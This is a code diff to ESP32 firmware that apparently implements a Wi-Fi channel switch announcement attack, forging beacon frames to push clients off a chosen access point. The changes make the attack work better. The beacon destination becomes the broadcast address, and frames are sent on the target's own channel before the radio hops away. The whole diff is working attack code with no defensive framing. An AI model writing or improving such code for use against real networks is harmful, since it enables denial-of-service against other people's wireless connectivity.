@@ -41,7 +41,7 @@ static void build_csa_beacon(uint8_t *beacon, size_t *beacon_len,
     
     *ptr++ = 0x80; *ptr++ = 0x00;
     *ptr++ = 0x00; *ptr++ = 0x00;
-    memcpy(ptr, bssid, 6); ptr += 6;
+    memset(ptr, 0xFF, 6); ptr += 6;
     memcpy(ptr, bssid, 6); ptr += 6;
     memcpy(ptr, bssid, 6); ptr += 6;
     *ptr++ = seq_num & 0xFF;
@@ -109,7 +109,7 @@ static void csa_attack_task(void *param) {
             uint8_t new_channel = get_different_channel(ap_channel);
             
             wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-            esp_wifi_set_channel(new_channel, second);
+            esp_wifi_set_channel(ap_channel, second);
             vTaskDelay(pdMS_TO_TICKS(1));
             
             uint8_t ssid_len = strnlen((char *)selected_aps[i].ssid, 32);
@@ -125,6 +125,8 @@ static void csa_attack_task(void *param) {
                 
                 vTaskDelay(pdMS_TO_TICKS(2));
             }
+            
+            esp_wifi_set_channel(new_channel, second);
         }
         
         vTaskDelay(pdMS_TO_TICKS(100));
